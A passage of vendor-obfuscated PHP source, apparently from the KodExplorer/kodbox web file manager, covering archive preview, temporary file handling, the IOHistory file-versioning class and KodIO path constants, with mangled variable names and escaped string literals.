$ÎîæÍ› = md5(implode($º¹‡³îĞ[11], $îº¢Ó€™)) . $º¹‡³îĞ[10] . get_path_ext($¶¾éİ·¶[$º¹‡³îĞ[32]]); } else { $îº¢Ó€™ = array($œ¨ÚŒëÕ[$º¹‡³îĞ[32]], $œ¨ÚŒëÕ[$º¹‡³îĞ[84]], $œ¨ÚŒëÕ[$º¹‡³îĞ[76]]); $ÎîæÍ› = md5(implode($º¹‡³îĞ[11], $îº¢Ó€™)) . $º¹‡³îĞ[10] . $¯Èëœ¹ã; } if ($¿±ûšÑ¥ == -1) { $Ó±§‰› = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\145\x77\x2f{$¸É·Ò®ñ}\x2f{$ÎîæÍ›}\56\x6c\157\147"; $ìôÍò¼¿ = self::infoFull($Ó±§‰›); if ($ìôÍò¼¿) { $Ó±§‰› = $ìôÍò¼¿[$º¹‡³îĞ[84]]; $ùËÅøîà = self::getContent($Ó±§‰›); if ($ùËÅøîà) { $Ñâ©´ëÀ = json_decode($ùËÅøîà, !0); $Ñâ©´ëÀ = is_array($Ñâ©´ëÀ) ? $Ñâ©´ëÀ : array(); if (count($Ñâ©´ëÀ) >= $Ùö©³æ§) { show_json(sprintf(LNG($º¹‡³îĞ[1202]), count($Ñâ©´ëÀ)), !1); } return $Ñâ©´ëÀ; } } else { $Ó±§‰› = self::mkfile($Ó±§‰›); } } $ÀÏ”¯æš = TEMP_FILES . $¸É·Ò®ñ; if (!is_dir($ÀÏ”¯æš)) { mk_dir($ÀÏ”¯æš); } $…”’ôİ– = $ÀÏ”¯æš . $º¹‡³îĞ[8] . $ÎîæÍ›; if (!@file_exists(self::iconvSystem($…”’ôİ–))) { if (isset($¶¾éİ·¶)) { url_request($ñÕó¥éÂ, $º¹‡³îĞ[1203], $…”’ôİ–); } else { $æÌ˜Ä¨ô = self::localFilePath($ñÕó¥éÂ, $¯Èëœ¹ã); $…”’ôİ– = $æÌ˜Ä¨ô ? $æÌ˜Ä¨ô : self::download($ñÕó¥éÂ, $…”’ôİ–); } } $…”’ôİ– = self::iconvSystem($…”’ôİ–); if ($¿±ûšÑ¥ >= 0) { $ƒü›©© = isset($ü²½œÑÖ[$º¹‡³îĞ[1204]]) ? $ü²½œÑÖ[$º¹‡³îĞ[1204]] : !1; $ÜæÀ‘àÚ = isset($ü²½œÑÖ[$º¹‡³îĞ[32]]) ? $ü²½œÑÖ[$º¹‡³îĞ[32]] : $º¹‡³îĞ[12]; KodArchive::filePreview($…”’ôİ–, $¿±ûšÑ¥, $ƒü›©©, $ÜæÀ‘àÚ); self::archiveExt(); die; } $ä‚Œ­®Ô = KodArchive::listContent($…”’ôİ–); self::archiveExt(); del_dir($ÀÏ”¯æš); if (!$ä‚Œ­®Ô[$º¹‡³îĞ[1196]]) { show_json($ä‚Œ­®Ô[$º¹‡³îĞ[1198]], !1); } $Ñâ©´ëÀ = json_encode($ä‚Œ­®Ô[$º¹‡³îĞ[1198]]); self::setContent($Ó±§‰›, $Ñâ©´ëÀ); if (count($ä‚Œ­®Ô[$º¹‡³îĞ[1198]]) >= $Ùö©³æ§) { show_json(sprintf(LNG($º¹‡³îĞ[1202]), count($ä‚Œ­®Ô[$º¹‡³îĞ[1198]])), !1); } return $ä‚Œ­®Ô[$º¹‡³îĞ[1198]]; } private static function fileExt($³œ¹—±µ) { $ƒá ¶Ú =& $_SERVER[ÏéâËõ‘]; $ëÑ§Óáü = $³œ¹—±µ[$ƒá ¶Ú[174]]; if ($ëÑ§Óáü == $ƒá ¶Ú[1205]) { $ş¯”¾ = $ƒá ¶Ú[1206]; if (substr($³œ¹—±µ[$ƒá ¶Ú[32]], -strlen($ş¯”¾)) == $ş¯”¾) { $ëÑ§Óáü = $ƒá ¶Ú[1207]; } } self::archiveExt($ëÑ§Óáü); return $ëÑ§Óáü; } private static function zipFileList($ÍÆÒğ“¬, $„›ŠÅÉÚ = false) { $ñ¥ã›ÆĞ =& $_SERVER[ÏéâËõ‘]; $ÖãÈœæÉ = array(); foreach ($ÍÆÒğ“¬ as $ûÕÕòÊ) { $º‰ÖÇØ = $ûÕÕòÊ[$ñ¥ã›ÆĞ[84]]; if ($„›ŠÅÉÚ) { $º‰ÖÇØ = self::copy($ûÕÕòÊ[$ñ¥ã›ÆĞ[84]], $„›ŠÅÉÚ, $ñ¥ã›ÆĞ[820]); } else { $ŸÄú·†í = self::init($ûÕÕòÊ[$ñ¥ã›ÆĞ[84]]); if ($ŸÄú·†í->getType() == $ñ¥ã›ÆĞ[106]) { $º‰ÖÇØ = $ŸÄú·†í->path; } } if ($º‰ÖÇØ && self::local()->exist($º‰ÖÇØ)) { $ÖãÈœæÉ[$ûÕÕòÊ[$ñ¥ã›ÆĞ[84]]] = $º‰ÖÇØ; } } if (!empty($ÖãÈœæÉ)) { return array_values($ÖãÈœæÉ); } show_json(LNG($ñ¥ã›ÆĞ[1171]), !1); } public static function tmpFileName($îÕÀäğ) { $öÕÇ¹Î” =& $_SERVER[ÏéâËõ‘]; $ç¸Òæ‹º = array($îÕÀäğ[$öÕÇ¹Î”[32]], $îÕÀäğ[$öÕÇ¹Î”[84]], $îÕÀäğ[$öÕÇ¹Î”[76]], $îÕÀäğ[$öÕÇ¹Î”[521]]); return md5(implode($öÕÇ¹Î”[11], $ç¸Òæ‹º)); } private static function localFilePath($œ¢³ÓğÚ, $˜ÈÀŞ¶Ï) { $Ê²şƒÛ‡ =& $_SERVER[ÏéâËõ‘]; if ($˜ÈÀŞ¶Ï == $Ê²şƒÛ‡[1208] && strtoupper(substr(PHP_OS, 0, 3)) == $Ê²şƒÛ‡[1209]) { return !1; } $îÑ€Ü¬ = KodIO::parse($œ¢³ÓğÚ); if ($îÑ€Ü¬[$Ê²şƒÛ‡[33]] == KodIO::KOD_SOURCE) { $ËıôŸŸ = Model($Ê²şƒÛ‡[827])->fileInfoGet(KodIO::sourceID($œ¢³ÓğÚ)); if (!$ËıôŸŸ[$Ê²şƒÛ‡[84]]) { show_json($Ê²şƒÛ‡[1210], !1); } $œ¢³ÓğÚ = $ËıôŸŸ[$Ê²şƒÛ‡[84]]; } $öñçõ†ö = self::init($œ¢³ÓğÚ); if ($öñçõ†ö->pathParse[$Ê²şƒÛ‡[1156]]) { $œ¢³ÓğÚ = $öñçõ†ö->pathParse[$Ê²şƒÛ‡[1156]]; $öñçõ†ö = self::init($œ¢³ÓğÚ); } $ê²ä¶‰Ê = $öñçõ†ö->getType(); if ($ê²ä¶‰Ê == $Ê²şƒÛ‡[106] || $ê²ä¶‰Ê == $Ê²şƒÛ‡[1211]) { if (!$öñçõ†ö->exist($öñçõ†ö->path)) { show_json(LNG($Ê²şƒÛ‡[105]), !1); } return $öñçõ†ö->path; } return !1; } private static function archiveExt($§¤ÛŠ = '') { $GLOBALS[$_SERVER[ÏéâËõ‘][1212]] = $§¤ÛŠ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $È²Õ¾­¥ =& $_SERVER[ÏéâËõ‘]; $¾û¿ÚÙ = $GLOBALS[$È²Õ¾­¥[6]][$È²Õ¾­¥[89]]; if ($¾û¿ÚÙ[$È²Õ¾­¥[1213]] != 1) { return; } if ($¾û¿ÚÙ[$È²Õ¾­¥[1214]] <= 0) { return; } if (isset($_REQUEST[$È²Õ¾­¥[1215]]) && $_REQUEST[$È²Õ¾­¥[1215]] == $È²Õ¾­¥[88]) { return; } Hook::bind($È²Õ¾­¥[1216], $È²Õ¾­¥[1217]); Hook::bind($È²Õ¾­¥[1218], $È²Õ¾­¥[1219]); Hook::bind($È²Õ¾­¥[1220], $È²Õ¾­¥[1221]); Hook::bind($È²Õ¾­¥[1222], $È²Õ¾­¥[1223]); Hook::bind($È²Õ¾­¥[1224], $È²Õ¾­¥[1225]); Hook::bind($È²Õ¾­¥[1226], $È²Õ¾­¥[1227]); } public static function eventBeforeUpload($—­•ƒºÁ) { if ($—­•ƒºÁ[3] && $—­•ƒºÁ[3] != REPEAT_REPLACE) { return; } $¨ìÏåÈå = self::parsePath($—­•ƒºÁ[0]); if (!$¨ìÏåÈå) { return; } self::add($¨ìÏåÈå); } public static function eventBeforeEdit($¯¾œ°ö­) { $É˜¿Ãëõ = self::parsePath($¯¾œ°ö­[0]); if (!$É˜¿Ãëõ) { return; } self::add($É˜¿Ãëõ); } public static function eventBeforeCopyFile($…òúùû¥, $ŸŒö”÷ß, $± ›üĞ, $ôèÌŠÜõ, $ÎØ‘¶öø, $ª˜§¹»­) { $ÏØíçÜ =& $_SERVER[ÏéâËõ‘]; if (isset($± ›üĞ->_data[$ÏØíçÜ[1160]]) && $± ›üĞ->_data[$ÏØíçÜ[1160]]) { return; } $ŒÚï’Ç = $± ›üĞ->getPathOuter($ôèÌŠÜõ); $º“Øˆ Õ = self::parsePath($ŒÚï’Ç); if (!$º“Øˆ Õ) { return; } self::add($º“Øˆ Õ); } public static function eventBeforeRename($ˆ›§Ê²±) { $Ì–’†ŞÁ =& $_SERVER[ÏéâËõ‘]; $ƒƒšİá¼ = self::parsePath($ˆ›§Ê²±[0]); if (!$ƒƒšİá¼) { return; } $—‡Œ€­ = self::checkInHistory($ƒƒšİá¼); if (!$—‡Œ€­) { return; } if ($—‡Œ€­[$Ì–’†ŞÁ[33]] == $Ì–’†ŞÁ[199]) { $‡”ñÍøµ = self::listData($ƒƒšİá¼); if ($‡”ñÍøµ && $‡”ñÍøµ[$Ì–’†ŞÁ[369]]) { self::moveHistory($ƒƒšİá¼, $ˆ›§Ê²±[1]); } } else { IO::rename($—‡Œ€­[$Ì–’†ŞÁ[84]], $ˆ›§Ê²±[1]); } } public static function eventBeforeMove($Òïœß³) { $Üãõõôû =& $_SERVER[ÏéâËõ‘]; $ñ¼šºşÛ = self::parsePath($Òïœß³[0]); if (!$ñ¼šºşÛ) { return; } $øš†ç« = self::parsePath($Òïœß³[1]); if (!$øš†ç«) { return; } $÷àó¾ãˆ = $Òïœß³[3]; $¿š÷£ö¶ = self::checkInHistory($ñ¼šºşÛ); if (!$¿š÷£ö¶) { return; } $êÎ­ŒÎÆ = self::pathHistory($øš†ç«); if ($¿š÷£ö¶[$Üãõõôû[33]] == $Üãõõôû[199]) { $ö²ÏÑíì = self::listData($ñ¼šºşÛ); $Çì½¥ƒÑ = rtrim($øš†ç«, $Üãõõôû[8]) . $Üãõõôû[8] . ($÷àó¾ãˆ ? $÷àó¾ãˆ : get_path_this($ñ¼šºşÛ)); $ƒÇ®Öšç = self::listData($Çì½¥ƒÑ); if ($ö²ÏÑíì && $ö²ÏÑíì[$Üãõõôû[369]] && $ƒÇ®Öšç && $ƒÇ®Öšç[$Üãõõôû[369]]) { return self::clear($ñ¼šºşÛ); } if ($ö²ÏÑíì && $ö²ÏÑíì[$Üãõõôû[369]]) { self::moveHistory($ñ¼šºşÛ, $÷àó¾ãˆ, $êÎ­ŒÎÆ); } } else { IO::move($¿š÷£ö¶[$Üãõõôû[84]], $êÎ­ŒÎÆ, !1, $÷àó¾ãˆ); self::clearEmptyFolder(IO::pathFather($¿š÷£ö¶[$Üãõõôû[84]])); } } public static function eventAfterRemove($¡Íçğäà, $´®ò¡Šî) { $¾şìİä =& $_SERVER[ÏéâËõ‘]; if (!$´®ò¡Šî) { return; } $§íú›ãí = self::parsePath($¡Íçğäà[0]); if (!$§íú›ãí) { return; } $ÄÙÉ÷ÊÇ = self::checkInHistory($§íú›ãí); if (!$ÄÙÉ÷ÊÇ) { return; } if ($ÄÙÉ÷ÊÇ[$¾şìİä[33]] == $¾şìİä[199]) { $·éŠá‘ = self::listData($§íú›ãí, !1); if ($·éŠá‘ && $·éŠá‘[$¾şìİä[369]]) { self::clear($§íú›ãí, !1); } } else { IO::remove($ÄÙÉ÷ÊÇ[$¾şìİä[84]]); self::clearEmptyFolder(IO::pathFather($ÄÙÉ÷ÊÇ[$¾şìİä[84]])); } } private static function checkInHistory($Èæ ˜€Å) { $Ø´«üı§ = self::pathHistory($Èæ ˜€Å); if (!IO::exist($Ø´«üı§)) { $Ø´«üı§ .= $_SERVER[ÏéâËõ‘][1228]; } return IO::exist($Ø´«üı§) ? IO::info($Ø´«üı§) : !1; } private static function parsePath($ÒÖªÇæÎ) { $ş°•ÁÂô =& $_SERVER[ÏéâËõ‘]; if (!$ÒÖªÇæÎ) { return !1; } if ($GLOBALS[$ş°•ÁÂô[1229]]) { return; } $õÔË€Éè = KodIO::parse($ÒÖªÇæÎ); $Î•ÏÃÅ‚ = $õÔË€Éè[$ş°•ÁÂô[33]]; $‘«øĞå³ = !$Î•ÏÃÅ‚ || $Î•ÏÃÅ‚ == KodIO::KOD_IO || $Î•ÏÃÅ‚ == KodIO::KOD_SHARE_ITEM; if (!$‘«øĞå³ || !$õÔË€Éè[$ş°•ÁÂô[1230]]) { return !1; } if (substr($ÒÖªÇæÎ, 0, strlen(DATA_PATH . $ş°•ÁÂô[1231])) == DATA_PATH . $ş°•ÁÂô[1231]) { return !1; } if ($Î•ÏÃÅ‚ == KodIO::KOD_SHARE_ITEM) { $Äè±Äè– = IO::init($ÒÖªÇæÎ); if ($Äè±Äè–->pathParse[$ş°•ÁÂô[1156]]) { return self::parsePath($Äè±Äè–->pathParse[$ş°•ÁÂô[1156]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $áø¨àá = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ş°•ÁÂô[1232]); foreach ($áø¨àá as $Ÿ±’¾ˆ†) { if (!$Î•ÏÃÅ‚ && substr($ÒÖªÇæÎ, 0, strlen($Ÿ±’¾ˆ†)) == $Ÿ±’¾ˆ†) { return !1; } } self::log($GLOBALS[$ş°•ÁÂô[1151]] . $ş°•ÁÂô[1233] . $ÒÖªÇæÎ); return $ÒÖªÇæÎ; } private static function pathHistory($È¯Ê¢™¼) { $´„Ğ½û =& $_SERVER[ÏéâËõ‘]; $Ë¦ÒÏì» = self::$_historyBase . ltrim(KodIO::clear($È¯Ê¢™¼), $´„Ğ½û[8]); $Ë¦ÒÏì» = str_replace(array($´„Ğ½û[1234]), array($´„Ğ½û[1235]), $Ë¦ÒÏì»); return $Ë¦ÒÏì»; } public static function log($Ò«¦”Åï) { } public static function historyCount($¸Ãï²ô«) { $çØ÷“Ëı =& $_SERVER[ÏéâËõ‘]; $À­¤İº¾ = array(); $ˆ‹Äï££ = array(); foreach ($¸Ãï²ô« as $şÛ¦ÒÂË) { $­›˜÷âñ = get_path_father($şÛ¦ÒÂË); if (!$ˆ‹Äï££[$­›˜÷âñ]) { $ˆ‹Äï££[$­›˜÷âñ] = array(); } $ˆ‹Äï££[$­›˜÷âñ][] = get_path_this($şÛ¦ÒÂË); } foreach ($ˆ‹Äï££ as $­›˜÷âñ => $¶×€­º•) { $Âæ¶ŒëŸ = self::parsePath($­›˜÷âñ); if (!$Âæ¶ŒëŸ) { continue; } foreach ($¶×€­º• as $¿ğò©•) { $ƒÑ¯™öÀ = self::listData(rtrim($Âæ¶ŒëŸ, $çØ÷“Ëı[8]) . $çØ÷“Ëı[8] . $¿ğò©•, !1); if ($ƒÑ¯™öÀ && $ƒÑ¯™öÀ[$çØ÷“Ëı[369]]) { $À­¤İº¾[rtrim($­›˜÷âñ, $çØ÷“Ëı[8]) . $çØ÷“Ëı[8] . $¿ğò©•] = count($ƒÑ¯™öÀ[$çØ÷“Ëı[369]]); } } } return $À­¤İº¾; } public static function add($ßÜÙãÊ”) { $ˆÔˆŸ‰Ã =& $_SERVER[ÏéâËõ‘]; $èÁÊ·ÓÃ = self::listData($ßÜÙãÊ”); if (!$èÁÊ·ÓÃ) { return; } $œ–Ó¦Î = Model($ˆÔˆŸ‰Ã[772])->get($ˆÔˆŸ‰Ã[1236]); $àÇßª…‰ = $GLOBALS[$ˆÔˆŸ‰Ã[6]][$ˆÔˆŸ‰Ã[89]][$ˆÔˆŸ‰Ã[1214]]; $ÁÄµ¦ÀÑ = $œ–Ó¦Î == $ˆÔˆŸ‰Ã[1237] ? min(5, $àÇßª…‰) : $àÇßª…‰; if ($àÇßª…‰ <= 0) { return; } $§üÁ»îµ = IO::info($ßÜÙãÊ”); $Ëµ“ÚË = $èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[369]]; if ($§üÁ»îµ[$ˆÔˆŸ‰Ã[76]] == 0) { return; } if ($§üÁ»îµ[$ˆÔˆŸ‰Ã[76]] >= 1024 * 1024 * 500) { return !1; } $§‹¹¦îµ = IO::hashSimple($ßÜÙãÊ”); if ($Ëµ“ÚË && $Ëµ“ÚË[0][$ˆÔˆŸ‰Ã[177]] == $§‹¹¦îµ) { return !0; } if (array_key_exists($ˆÔˆŸ‰Ã[202], $§üÁ»îµ) && !$§üÁ»îµ[$ˆÔˆŸ‰Ã[202]]) { return !1; } $õŒÆí‹Ò = short_id(time()); $î¶ıŒ› = array($ˆÔˆŸ‰Ã[399] => $õŒÆí‹Ò, $ˆÔˆŸ‰Ã[177] => $§‹¹¦îµ, $ˆÔˆŸ‰Ã[32] => $§üÁ»îµ[$ˆÔˆŸ‰Ã[32]] . $ˆÔˆŸ‰Ã[10] . date($ˆÔˆŸ‰Ã[1238]) . rand_string(1), $ˆÔˆŸ‰Ã[76] => $§üÁ»îµ[$ˆÔˆŸ‰Ã[76]], $ˆÔˆŸ‰Ã[454] => USER_ID, $ˆÔˆŸ‰Ã[200] => time(), $ˆÔˆŸ‰Ã[1239] => $ˆÔˆŸ‰Ã[12]); IO::mkdir($èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[1240]]); $ÕÊ™«ã = IO::copy($ßÜÙãÊ”, $èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[1240]], !1, $î¶ıŒ›[$ˆÔˆŸ‰Ã[32]]); if (!$ÕÊ™«ã) { self::clearEmptyFolder($èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[1240]]); return !1; } array_unshift($Ëµ“ÚË, $î¶ıŒ›); if (count($Ëµ“ÚË) > $ÁÄµ¦ÀÑ) { $ÄæÍæ = array_slice($Ëµ“ÚË, $ÁÄµ¦ÀÑ); foreach ($ÄæÍæ as $ÃÓ³»ÇÈ) { IO::remove($èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[1240]] . $ÃÓ³»ÇÈ[$ˆÔˆŸ‰Ã[32]]); } $Ëµ“ÚË = array_slice($Ëµ“ÚË, 0, $ÁÄµ¦ÀÑ); } return self::saveData($èÁÊ·ÓÃ[$ˆÔˆŸ‰Ã[1241]], $Ëµ“ÚË); } public static function remove($¯“Öî“à, $›”¥¸») { $Š¨¬Å× =& $_SERVER[ÏéâËõ‘]; $ØŸ‘×œÎ = self::listData($¯“Öî“à); $–—–±Æ‡ = array(); if (!$ØŸ‘×œÎ) { return !1; } foreach ($ØŸ‘×œÎ[$Š¨¬Å×[369]] as $»ş˜î¬í) { if ($»ş˜î¬í[$Š¨¬Å×[399]] == $›”¥¸») { IO::remove($ØŸ‘×œÎ[$Š¨¬Å×[1240]] . $»ş˜î¬í[$Š¨¬Å×[32]]); continue; } $–—–±Æ‡[] = $»ş˜î¬í; } return self::saveData($ØŸ‘×œÎ[$Š¨¬Å×[1241]], $–—–±Æ‡); } public static function clear($İœÆò÷Ñ, $ªËÆÚ = true) { $‘ß±Èú =& $_SERVER[ÏéâËõ‘]; $•ã‡Àí  = self::listData($İœÆò÷Ñ, $ªËÆÚ); if (!$•ã‡Àí ) { return !1; } foreach ($•ã‡Àí [$‘ß±Èú[369]] as $ãä­›±ì) { IO::remove($•ã‡Àí [$‘ß±Èú[1240]] . $ãä­›±ì[$‘ß±Èú[32]]); } return self::saveData($•ã‡Àí [$‘ß±Èú[1241]], array()); } public static function moveHistory($ÎÏéâÀ, $óÚôîÂ– = '', $Ââñ²£Õ = '') { $¤ü¹ÛÈâ =& $_SERVER[ÏéâËõ‘]; $ÄøÉø˜ƒ = self::listData($ÎÏéâÀ, !1); if (!$ÄøÉø˜ƒ || !$ÄøÉø˜ƒ[$¤ü¹ÛÈâ[369]]) { return !1; } $Æ“ÅˆÜ© = $¤ü¹ÛÈâ[1228]; $óÚôîÂ– = $óÚôîÂ– ? $óÚôîÂ– : get_path_this($ÎÏéâÀ); $Ââñ²£Õ = $Ââñ²£Õ ? $Ââñ²£Õ : $ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1240]]; $†±Ğƒâô = substr(get_path_this($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1241]]), 0, -strlen($Æ“ÅˆÜ©)); foreach ($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[369]] as $ŒÓ«•¿Ö => $ÁüÌµ”‰) { $¾‡‹î¢ã = $óÚôîÂ– . substr($ÁüÌµ”‰[$¤ü¹ÛÈâ[32]], strlen($†±Ğƒâô)); $òÎÚ–óÓ = IO::move($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1240]] . $ÁüÌµ”‰[$¤ü¹ÛÈâ[32]], $Ââñ²£Õ, !1, $¾‡‹î¢ã); if ($òÎÚ–óÓ) { $ÄøÉø˜ƒ[$¤ü¹ÛÈâ[369]][$ŒÓ«•¿Ö][$¤ü¹ÛÈâ[32]] = $¾‡‹î¢ã; } } $ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1241]] = IO::move($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1241]], $Ââñ²£Õ, !1, $óÚôîÂ– . $Æ“ÅˆÜ©); self::saveData($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1241]], $ÄøÉø˜ƒ[$¤ü¹ÛÈâ[369]]); self::clearEmptyFolder($ÄøÉø˜ƒ[$¤ü¹ÛÈâ[1240]]); } public static function rollback($î‘“ûĞ, $ú÷ÜÆ) { $üØÔêØï =& $_SERVER[ÏéâËõ‘]; $ªœöö†° = self::listData($î‘“ûĞ); if (!$ªœöö†°) { return; } $Ÿ¨“€Ìú = IO::info($î‘“ûĞ); foreach ($ªœöö†°[$üØÔêØï[369]] as $÷öáú£’ => $õ¡õÍ¯‰) { if ($õ¡õÍ¯‰[$üØÔêØï[399]] == $ú÷ÜÆ) { self::add($î‘“ûĞ); $ÃÖåéÒÙ = $ªœöö†°[$üØÔêØï[1240]] . $õ¡õÍ¯‰[$üØÔêØï[32]]; $¹ØñğÂÜ = IO::copy($ÃÖåéÒÙ, IO::pathFather($î‘“ûĞ), REPEAT_REPLACE, $Ÿ¨“€Ìú[$üØÔêØï[32]]); if ($¹ØñğÂÜ) { self::remove($î‘“ûĞ, $ú÷ÜÆ); } return $¹ØñğÂÜ; } } return !1; } public static function setDetail($¤ı³ííŠ, $÷ş¥á³â, $•Ú ñá) { $åşñ¼Ï =& $_SERVER[ÏéâËõ‘]; $ğ¢‹©éü = self::listData($¤ı³ííŠ); if (!$ğ¢‹©éü) { return; } foreach ($ğ¢‹©éü[$åşñ¼Ï[369]] as $‰ÍÔ±‚× => $âãçÚ£º) { if ($âãçÚ£º[$åşñ¼Ï[399]] == $÷ş¥á³â) { $ğ¢‹©éü[$åşñ¼Ï[369]][$‰ÍÔ±‚×][$åşñ¼Ï[1239]] = $•Ú ñá; self::saveData($ğ¢‹©éü[$åşñ¼Ï[1241]], $ğ¢‹©éü[$åşñ¼Ï[369]]); return !0; } } return !1; } public static function fileInfo($Š­Éİ», $Íìà«µü) { $Ó­Ÿ¥¡ =& $_SERVER[ÏéâËõ‘]; $Ã©“ò½Ÿ = self::listData($Š­Éİ»); if (!$Ã©“ò½Ÿ) { show_json(LNG($Ó­Ÿ¥¡[105]), !1); } $¹Ó¬ØÕü = $Ó­Ÿ¥¡[12]; foreach ($Ã©“ò½Ÿ[$Ó­Ÿ¥¡[369]] as $‚¸ïÀ¾ => $»©Å¨âá) { if ($»©Å¨âá[$Ó­Ÿ¥¡[399]] != $Íìà«µü) { continue; } $¹Ó¬ØÕü = $Ã©“ò½Ÿ[$Ó­Ÿ¥¡[1240]] . $»©Å¨âá[$Ó­Ÿ¥¡[32]]; break; } if (!$¹Ó¬ØÕü) { show_json(LNG($Ó­Ÿ¥¡[105]), !1); } return IO::info($¹Ó¬ØÕü); } public static function fileOut($Àû¥ˆÈ, $šÁàÒ¢×, $à¯ã®ÅÎ = false) { $˜Ó›ïƒü =& $_SERVER[ÏéâËõ‘]; $×¯Ó ö = self::fileInfo($Àû¥ˆÈ, $šÁàÒ¢×); $íı˜ü‘¸ =& $GLOBALS[$˜Ó›ïƒü[7]]; $à¯ã®ÅÎ = isset($íı˜ü‘¸[$˜Ó›ïƒü[1204]]) && $íı˜ü‘¸[$˜Ó›ïƒü[1204]] == 1; if (isset($íı˜ü‘¸[$˜Ó›ïƒü[33]]) && $íı˜ü‘¸[$˜Ó›ïƒü[33]] == $˜Ó›ïƒü[1242]) { return IO::fileOutImage($×¯Ó ö[$˜Ó›ïƒü[84]], $íı˜ü‘¸[$˜Ó›ïƒü[1243]]); } IO::fileOut($×¯Ó ö[$˜Ó›ïƒü[84]], $à¯ã®ÅÎ, get_path_this($Àû¥ˆÈ)); } public static function listData($‰Ò‡»›œ, $å²±±æ = true) { $³„ò‰Á =& $_SERVER[ÏéâËõ‘]; if ($å²±±æ && !IO::exist($‰Ò‡»›œ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($‰Ò‡»›œ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $´İæùèó = self::pathHistory($‰Ò‡»›œ); $œ§¨å÷º = array($³„ò‰Á[1241] => $´İæùèó . $³„ò‰Á[1228], $³„ò‰Á[1240] => rtrim(get_path_father($´İæùèó), $³„ò‰Á[8]) . $³„ò‰Á[8], $³„ò‰Á[369] => array()); $¡¥÷Ö¼ = IO::getContent($œ§¨å÷º[$³„ò‰Á[1241]]); if ($¡¥÷Ö¼) { $êâ—æ–¢ = json_decode($¡¥÷Ö¼, !0); if (is_array($êâ—æ–¢)) { $œ§¨å÷º[$³„ò‰Á[369]] = $êâ—æ–¢; } } return $œ§¨å÷º; } private static function saveData($êĞÍ¬»Ş, $ÖÈ¶³Ê) { $ÙÏã„æº =& $_SERVER[ÏéâËõ‘]; self::log($ÙÏã„æº[1244] . $êĞÍ¬»Ş . $ÙÏã„æº[71] . count($ÖÈ¶³Ê), $ÙÏã„æº[754]); if ($ÖÈ¶³Ê) { return IO::setContent($êĞÍ¬»Ş, json_encode($ÖÈ¶³Ê)); } $ä¼‡í¶à = IO::pathFather($êĞÍ¬»Ş); IO::remove($êĞÍ¬»Ş); self::clearEmptyFolder($ä¼‡í¶à); return !0; } public static function clearEmptyFolder($×æçÌ¨¨) { $Æç¯Ç« =& $_SERVER[ÏéâËõ‘]; if (trim($×æçÌ¨¨, $Æç¯Ç«[8]) == trim(self::$_historyBase, $Æç¯Ç«[8])) { return; } $ßÕÇş•Ó = IO::pathFather($×æçÌ¨¨); $’åÍÒ‡ˆ = IO::has($×æçÌ¨¨, !0); if ($’åÍÒ‡ˆ[$Æç¯Ç«[207]] > 0 || $’åÍÒ‡ˆ[$Æç¯Ç«[208]] > 0) { return; } IO::remove($×æçÌ¨¨); self::clearEmptyFolder($ßÕÇş•Ó); } private static function getBasePath() { $ÜÍÛñé¸ =& $_SERVER[ÏéâËõ‘]; $ÕÁÇ»š = Model($ÜÍÛñé¸[1245])->get($ÜÍÛñé¸[1246]); if ($ÕÁÇ»š) { if (!IO::exist($ÕÁÇ»š)) { IO::mkdir($ÕÁÇ»š); } if (get_path_this($ÕÁÇ»š) == $ÜÍÛñé¸[1231]) { $»ŒÈÛ = $ÜÍÛñé¸[1247] . rand_string(8); @rename($ÕÁÇ»š, get_path_father($ÕÁÇ»š) . $ÜÍÛñé¸[8] . $»ŒÈÛ); $ÕÁÇ»š = DATA_PATH . $»ŒÈÛ . $ÜÍÛñé¸[8]; file_put_contents(DATA_PATH . $ÜÍÛñé¸[1248], $ÜÍÛñé¸[12]); Model($ÜÍÛñé¸[1245])->set($ÜÍÛñé¸[1246], $ÕÁÇ»š); } return $ÕÁÇ»š; } $ÕÁÇ»š = DATA_PATH . $ÜÍÛñé¸[1247] . rand_string(8) . $ÜÍÛñé¸[8]; $ÕÁÇ»š = IO::mkdir($ÕÁÇ»š); $ÕÁÇ»š = rtrim($ÕÁÇ»š, $ÜÍÛñé¸[8]) . $ÜÍÛñé¸[8]; file_put_contents($ÕÁÇ»š . $ÜÍÛñé¸[1248], $ÜÍÛñé¸[12]); file_put_contents(DATA_PATH . $ÜÍÛñé¸[1248], $ÜÍÛñé¸[12]); Model($ÜÍÛñé¸[1245])->set($ÜÍÛñé¸[1246], $ÕÁÇ»š); return $ÕÁÇ»š; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\122\145\143\171\x63\154\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\x46\151\x6c\x65\124\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\x70\122\x6f\157\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\162\x53\x68\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\x53\x68\x61\162\145\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\164\x65\x6d\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = 